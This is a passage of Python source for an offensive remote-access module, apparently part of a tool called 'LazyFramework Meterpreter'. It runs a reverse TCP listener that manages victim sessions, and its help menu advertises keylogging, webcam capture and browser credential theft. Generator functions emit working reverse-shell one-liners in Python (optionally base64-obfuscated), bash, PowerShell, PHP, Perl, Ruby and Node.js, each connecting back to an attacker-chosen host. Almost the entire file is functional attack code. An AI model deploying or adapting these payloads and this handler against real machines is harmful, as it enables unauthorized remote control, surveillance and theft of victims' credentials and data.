{YELLOW}╔══════════════════════════════════════════════════════════════════╗{RESET}
{YELLOW}║                    METERPRETER COMMAND REFERENCE                  ║{RESET}
{YELLOW}╠══════════════════════════════════════════════════════════════════╣{RESET}
{YELLOW}║{RESET}  {GREEN}help{RESET}                    - Show this help                        {YELLOW}║{RESET}
{YELLOW}║{RESET}  {GREEN}info{RESET}                    - Show session information              {YELLOW}║{RESET}
{YELLOW}║{RESET}  {GREEN}sessions{RESET}                - Show all active sessions              {YELLOW}║{RESET}
{YELLOW}║{RESET}  {GREEN}exit / quit{RESET}             - Close this session                    {YELLOW}║{RESET}
{YELLOW}║{RESET}  {GREEN}shell{RESET}                   - Spawn PTY shell                        {YELLOW}║{RESET}
{YELLOW}║{RESET}  {GREEN}upload <local> [remote]{RESET} - Upload file to target                  {YELLOW}║{RESET}
{YELLOW}║{RESET}  {GREEN}download <remote> [local]{RESET} - Download file from target            {YELLOW}║{RESET}
{YELLOW}║{RESET}  {GREEN}keylogger start{RESET}         - Start keylogger on target              {YELLOW}║{RESET}
{YELLOW}║{RESET}  {GREEN}keylogger stop{RESET}          - Stop keylogger                         {YELLOW}║{RESET}
{YELLOW}║{RESET}  {GREEN}keylogger get{RESET}           - Retrieve keylogger logs                {YELLOW}║{RESET}
{YELLOW}║{RESET}  {GREEN}webcam{RESET}                  - Capture webcam photo                   {YELLOW}║{RESET}
{YELLOW}║{RESET}  {GREEN}browser{RESET}                 - Extract all browser data               {YELLOW}║{RESET}
{YELLOW}║{RESET}  {GREEN}browser creds{RESET}           - Extract saved credentials only         {YELLOW}║{RESET}
{YELLOW}║{RESET}  {GREEN}clear{RESET}                   - Clear screen                           {YELLOW}║{RESET}
{YELLOW}║{RESET}  {GREEN}<command>{RESET}               - Execute any command on target          {YELLOW}║{RESET}
{YELLOW}╚══════════════════════════════════════════════════════════════════╝{RESET}
""")
    
    def _show_info(self):
        print(f"""
{YELLOW}╔══════════════════════════════════════════════════════════════════╗{RESET}
{YELLOW}║                         SESSION INFORMATION                      ║{RESET}
{YELLOW}╠══════════════════════════════════════════════════════════════════╣{RESET}
{YELLOW}║{RESET}  {GREEN}Session ID{RESET}    : {WHITE}{self.id}{RESET:<57}{YELLOW}║{RESET}
{YELLOW}║{RESET}  {GREEN}Status{RESET}       : {WHITE}{self.status}{RESET:<57}{YELLOW}║{RESET}
{YELLOW}║{RESET}  {GREEN}Target{RESET}       : {WHITE}{self.rhost}:{self.rport}{RESET:<50}{YELLOW}║{RESET}
{YELLOW}║{RESET}  {GREEN}Listener{RESET}     : {WHITE}{self.lhost}:{self.lport}{RESET:<50}{YELLOW}║{RESET}
{YELLOW}║{RESET}  {GREEN}Type{RESET}         : {WHITE}{self.type}{RESET:<57}{YELLOW}║{RESET}
{YELLOW}║{RESET}  {GREEN}OS{RESET}           : {WHITE}{self.os.upper()}{RESET:<57}{YELLOW}║{RESET}
{YELLOW}║{RESET}  {GREEN}Created{RESET}      : {WHITE}{self.created}{RESET:<57}{YELLOW}║{RESET}
{YELLOW}║{RESET}  {GREEN}Keylogger{RESET}    : {WHITE}{'ACTIVE' if self.keylogger_active else 'INACTIVE'}{RESET:<57}{YELLOW}║{RESET}
{YELLOW}║{RESET}  {GREEN}Commands{RESET}     : {WHITE}{len(self.command_history)}{RESET:<57}{YELLOW}║{RESET}
{YELLOW}╚══════════════════════════════════════════════════════════════════╝{RESET}
""")
    
    def _show_sessions(self):
        with SESSIONS_LOCK:
            if not SESSIONS:
                print(f"{YELLOW}[*] No active sessions{RESET}")
                return
            
            print(f"""
{YELLOW}╔══════════════════════════════════════════════════════════════════╗{RESET}
{YELLOW}║                        ACTIVE SESSIONS                            ║{RESET}
{YELLOW}╠══════════════════════════════════════════════════════════════════╣{RESET}""")
            for sid, sess in SESSIONS.items():
                if hasattr(sess, 'status'):
                    key_status = "KEY" if getattr(sess, 'keylogger_active', False) else "   "
                    print(f"{YELLOW}║{RESET}  {GREEN}{sid}{RESET}  |  {sess.rhost}:{sess.rport}  |  {sess.os.upper():6}  |  {sess.status}  |  [{key_status}] {YELLOW}║{RESET}")
            print(f"{YELLOW}╚══════════════════════════════════════════════════════════════════╝{RESET}")
    
    def close(self):
        try:
            self.socket.close()
        except:
            pass
        self.status = "closed"

# ==================== LISTENER ====================
class ReverseTCPListener:
    def __init__(self, lhost, lport, auto_handle=True):
        self.lhost = lhost
        self.lport = lport
        self.auto_handle = auto_handle
        self.running = False
        self.server_socket = None
        self.gui_mode = False          # ← TAMBAHKAN INI
    
    def start(self):
        self.running = True
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((self.lhost, self.lport))
        self.server_socket.listen(5)
        
        print(f"""
    {YELLOW}╔══════════════════════════════════════════════════════════════════╗{RESET}
    {YELLOW}║                    LAZYFRAMEWORK METERPRETER                      ║{RESET}
    {YELLOW}║                       REVERSE TCP LISTENER                        ║{RESET}
    {YELLOW}╠══════════════════════════════════════════════════════════════════╣{RESET}
    {YELLOW}║{RESET}  {GREEN}Host{RESET}: {WHITE}{self.lhost}{RESET:<45} {YELLOW}║{RESET}
    {YELLOW}║{RESET}  {GREEN}Port{RESET}: {WHITE}{self.lport}{RESET:<45} {YELLOW}║{RESET}
    {YELLOW}╚══════════════════════════════════════════════════════════════════╝{RESET}
    """)
        
        print(f"{YELLOW}[*] Waiting for incoming connections...{RESET}\n")
        
        while self.running:
            try:
                self.server_socket.settimeout(1.0)
                client, addr = self.server_socket.accept()
                print(f"{GREEN}[+] Connection from {addr[0]}:{addr[1]}{RESET}")
                
                session_id = "session_%d" % (len(SESSIONS) + 1)
                session = ReverseTCPSession(session_id, client, addr, self.lhost, self.lport)
                session._gui_mode = getattr(self, 'gui_mode', False)
                
                # Welcome banner
                if getattr(self, 'gui_mode', False):
                    # JANGAN KIRIM BANNER APAPUN untuk mode GUI
                    # Kirim newline saja agar tidak error
                    client.send(b"")
                else:
                    # Banner untuk terminal
                    welcome = f"""
    {YELLOW}╔══════════════════════════════════════════════════════════════════╗{RESET}
    {YELLOW}║              LAZYFRAMEWORK METERPRETER CONNECTED                 ║{RESET}
    {YELLOW}╠══════════════════════════════════════════════════════════════════╣{RESET}
    {YELLOW}║{RESET}  {GREEN}[*] Session established{RESET}                                         {YELLOW}║{RESET}
    {YELLOW}║{RESET}  {GREEN}[*] Type 'help' for available commands{RESET}                           {YELLOW}║{RESET}
    {YELLOW}╚══════════════════════════════════════════════════════════════════╝{RESET}

    """
                    client.send(welcome.encode('utf-8', errors='ignore'))
                
                # JANGAN KIRIM PROMPT "lzf-meterpreter>"
                # client.send(b"lzf-meterpreter> ")  <-- HAPUS INI
                
                with SESSIONS_LOCK:
                    SESSIONS[session_id] = session
                
                print(f"{GREEN}[+] Session {session_id} opened ({addr[0]}:{addr[1]} -> {self.lhost}:{self.lport}){RESET}")
                print(f"{CYAN}[*] OS Detected: {session.os.upper()}{RESET}")
                
                if self.auto_handle and not getattr(self, 'gui_mode', False):
                    threading.Thread(target=session.interactive_mode, daemon=True).start()
                else:
                    print(f"[+] Session {session_id} created for GUI handling")
                    
            except socket.timeout:
                continue
            except Exception as e:
                if self.running:
                    print(f"{RED}[!] Error: {str(e)}{RESET}")
    
    def stop(self):
        self.running = False
        if self.server_socket:
            self.server_socket.close()
        with SESSIONS_LOCK:
            for session in SESSIONS.values():
                session.close()
            SESSIONS.clear()

# ==================== PAYLOAD GENERATORS ====================
def generate_python(lhost, lport, level, use_b64):
    raw = 'import socket,os,pty;s=socket.socket();s.connect(("%s",%d));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' % (lhost, lport)
    if use_b64:
        b64 = base64.b64encode(raw.encode()).decode()
        return "python3 -c 'import base64,os,pty;exec(base64.b64decode(\"%s\").decode())'" % b64
    return "python3 -c '%s'" % raw

def generate_bash(lhost, lport, level, use_b64):
    return "bash -i >& /dev/tcp/%s/%d 0>&1" % (lhost, lport)

def generate_powershell(lhost, lport, level, use_b64):
    return 'powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient(\'%s\',%d);$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+\'PS \'+(pwd).Path+\'> \';$sb3=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb3,0,$sb3.Length);$s.Flush()};$c.Close()"' % (lhost, lport)

def generate_php(lhost, lport, level, use_b64):
    return "php -r '$s=fsockopen(\"%s\",%d);exec(\"/bin/sh -i <&3 >&3 2>&3\");' 3<>/dev/tcp/%s/%d" % (lhost, lport, lhost, lport)

def generate_perl(lhost, lport, level, use_b64):
    return 'perl -e \'use Socket;$i="%s";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh");}\'' % (lhost, lport)

def generate_ruby(lhost, lport, level, use_b64):
    return 'ruby -rsocket -e \'exit if fork;c=TCPSocket.new("%s",%d);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\'' % (lhost, lport)

def generate_nodejs(lhost, lport, level, use_b64):
    return 'node -e \'var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var c=new net.Socket();c.connect(%d,"%s",function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);});\'' % (lport, lhost)

# ==================== EXPORTED FUNCTIONS FOR GUI ====================
def send_command_to_session(session_id, command):
    """Send command ke session (untuk GUI)"""
    with SESSIONS_LOCK:
        if session_id not in SESSIONS:
            return False
        session = SESSIONS[session_id]
    
    if not hasattr(session, 'socket') or not session.socket:
        return False
    
    try:
        # Gunakan method send_command yang sudah improved
        response = session.send_command(command)
        return True
    except:
        return False

def send_command_to_session_with_gui(session_id, command, framework_session):
    """Wrapper untuk GUI compatibility"""
    return send_command_to_session(session_id, command)

def kill_session(session_id):
    """Kill session by ID"""
    with SESSIONS_LOCK:
        if session_id in SESSIONS:
            session = SESSIONS[session_id]
            try:
                session.close()
            except:
                pass
            del SESSIONS[session_id]
            return True
    return False

def list_sessions():
    """List all active sessions"""
    with SESSIONS_LOCK:
        return list(SESSIONS.keys())

def get_session(session_id):
    """Get session object by ID"""
    with SESSIONS_LOCK:
        return SESSIONS.get(session_id)

def check_session_alive(session_id):
    """Check if session socket is alive"""
    with SESSIONS_LOCK:
        if session_id not in SESSIONS:
            return False
        session = SESSIONS[session_id]
    
    if not hasattr(session, 'is_socket_alive'):
        return False
    
    return session.is_socket_alive()

# ==================== MAIN RUN FUNCTION ====================
def run(session, options):
    lhost = options.get("LHOST", "0.0.0.0")
    lport = int(options.get("LPORT", 4444))
    lang = options.get("LANGUAGE", "python").lower()
    obf_level = options.get("OBF_LEVEL", "medium").lower()
    use_b64 = str(options.get("USE_BASE64", True)).lower() == "true"
    auto_handle = str(options.get("AUTO_HANDLE", True)).lower() == "true"
    
    # Header
    print(f"""
{YELLOW}╔══════════════════════════════════════════════════════════════════╗{RESET}
{YELLOW}║                    LAZYFRAMEWORK METERPRETER                      ║{RESET}
{YELLOW}║                    REVERSE TCP HANDLER v2.0                       ║{RESET}
{YELLOW}╠══════════════════════════════════════════════════════════════════╣{RESET}""")
    print(f"{YELLOW}║{RESET}  {GREEN}LHOST{RESET}       : {WHITE}{lhost}{RESET:<45} {YELLOW}║{RESET}")
    print(f"{YELLOW}║{RESET}  {GREEN}LPORT{RESET}       : {WHITE}{lport}{RESET:<45} {YELLOW}║{RESET}")
    print(f"{YELLOW}║{RESET}  {GREEN}LANGUAGE{RESET}    : {WHITE}{lang}{RESET:<45} {YELLOW}║{RESET}")
    print(f"{YELLOW}║{RESET}  {GREEN}OBF_LEVEL{RESET}   : {WHITE}{obf_level}{RESET:<45} {YELLOW}║{RESET}")
    print(f"{YELLOW}║{RESET}  {GREEN}USE_BASE64{RESET}  : {WHITE}{str(use_b64)}{RESET:<45} {YELLOW}║{RESET}")
    print(f"{YELLOW}║{RESET}  {GREEN}AUTO_HANDLE{RESET} : {WHITE}{str(auto_handle)}{RESET:<45} {YELLOW}║{RESET}")
    print(f"{YELLOW}╚══════════════════════════════════════════════════════════════════╝{RESET}")
    
    # Generate payload
    languages = {
        "python": generate_python,
        "bash": generate_bash,
        "powershell": generate_powershell,
        "php": generate_php,
        "perl": generate_perl,
        "ruby": generate_ruby,
        "nodejs": generate_nodejs,
    }
    
    if lang != "none":
        print(f"\n{GREEN}[+] GENERATED PAYLOADS:{RESET}")
        print(f"{YELLOW}╔══════════════════════════════════════════════════════════════════╗{RESET}")
        
        if lang == "all":
            for name, func in languages.items():
                payload = func(lhost, lport, obf_level, use_b64)
                print(f"\n{CYAN}[{name.upper()}]{RESET}")
                print(f"{WHITE}{payload}{RESET}")
        elif lang in languages:
            payload = languages[lang](lhost, lport, obf_level, use_b64)
            print(f"\n{CYAN}[{lang.upper()} PAYLOAD]{RESET}")
            print(f"{WHITE}{payload}{RESET}")
        else:
            print(f"\n{RED}[!] Language '{lang}' not supported{RESET}")
            print(f"{YELLOW}[*] Supported: {', '.join(languages.keys())} or 'all' or 'none'{RESET}")
        
        print(f"\n{YELLOW}╚══════════════════════════════════════════════════════════════════╝{RESET}")
    
    # Start listener
    print(f"\n{YELLOW}[*] Starting listener on {lhost}:{lport}...{RESET}")
    
    listener = ReverseTCPListener(lhost, lport, auto_handle)
    listener.gui_mode = True
    try:
        listener.start()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[*] Shutting down listener...{RESET}")
    finally:
        listener.stop()
        print(f"{GREEN}[+] Listener stopped{RESET}")
    
    return "Module execution completed"